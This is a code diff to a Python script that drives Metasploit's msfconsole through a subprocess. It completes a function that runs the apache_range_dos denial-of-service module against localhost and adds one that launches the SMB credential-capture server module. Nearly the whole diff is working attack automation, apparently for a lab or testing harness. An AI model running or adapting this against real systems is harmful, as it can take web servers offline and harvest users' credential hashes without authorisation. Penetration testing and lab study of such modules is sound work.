@@ -23,9 +23,28 @@ def dos_exploit():
 	p = Popen(['msfconsole'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=STDOUT)
 	print("Starting msfconsole...")
 	time.sleep(20)
+	print("Running DoS attack...")
 	p.stdin.write(b'use auxiliary/dos/http/apache_range_dos\n')
 	p.stdin.flush()
 	p.stdin.write(b'set RHOST localhost\n')
+	p.stdin.flush()
+	p.stdin.write(b'run\n')
+	p.stdin.flush()
+	while True:
+		line = p.stdout.readline()
+		if b'Auxiliary module execution completed' in line:
+			print(line.rstrip().decode())
+			p.kill()
+			break
+		print(line.rstrip().decode())
+	return
+
+def smb_exploit():
+	p = Popen(['msfconsole'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=STDOUT)
+	print("Starting msfconsole...")
+	time.sleep(20)
+	print("Running SMB attack...")
+	p.stdin.write(b'use auxiliary/server/capture/smb\n')
 	p.stdin.flush()
 	p.stdin.write(b'run\n')
 	p.stdin.flush()
